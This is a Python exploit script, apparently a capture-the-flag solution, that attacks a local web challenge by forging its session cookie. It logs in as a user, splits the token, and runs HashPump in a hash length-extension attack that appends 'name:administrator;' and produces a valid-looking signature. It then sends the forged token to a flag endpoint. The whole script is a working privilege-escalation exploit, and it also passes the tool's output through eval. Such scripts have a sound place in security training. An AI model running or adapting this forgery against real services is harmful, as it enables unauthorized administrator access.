#!/usr/bin/env python3
import requests
import os
import base64
import subprocess
import binascii
import json

HOST = "localhost"
PORT = "30002"


def main():
    if not os.path.exists("./HashPump-partialhash/hashpump"):
        print("Missing hashpump binary")
        return

    login_endpoint = f"http://{HOST}:{PORT}/api/login"
    flag_endpoint = f"http://{HOST}:{PORT}/api/flag"

    data = {
        "username": "james",
        "password": "web",
    }

    response = requests.post(login_endpoint, json=data)

    if response.status_code != 200:
        print("Something went wrong")
        return

    session_cookie = response.cookies["session"]

    try:
        b64_header, b64_data, b64_signature = session_cookie[1:-1].split(".")
    except ValueError:
        print("Something went wrong")
        return

    header = base64.b64decode(b64_header.encode())
    data = base64.b64decode(b64_data.encode())

    result = subprocess.run([
        './HashPump-partialhash/hashpump', '-k', '32', '-d', header + data, '-s',
        base64.b64decode(b64_signature.encode()).hex(), '-a', 'name:administrator;'
    ],
                            capture_output=True,
                            text=True)

    new_sig, new_data = result.stdout.strip().splitlines()[2:]

    new_sig = new_sig.split(": ")[1]
    new_data = eval(f'b"{new_data}"').replace(b"typ:JWT;alg:HS256;", b"")

    print(f"[+] New hash: {new_sig}")
    print("[+] New data:", new_data)

    b64_new_data = base64.b64encode(new_data).decode()
    b64_new_sig = base64.b64encode(binascii.unhexlify(new_sig)).decode()

    token = f"{b64_header}.{b64_new_data}.{b64_new_sig}"

    cookies = {"session": token}

    response = requests.get(flag_endpoint, cookies=cookies)

    if response.status_code == 200:
        flag = json.loads(response.text)["message"]
        print(f"[+] Flag: {flag}")


if __name__ == "__main__":
    main()
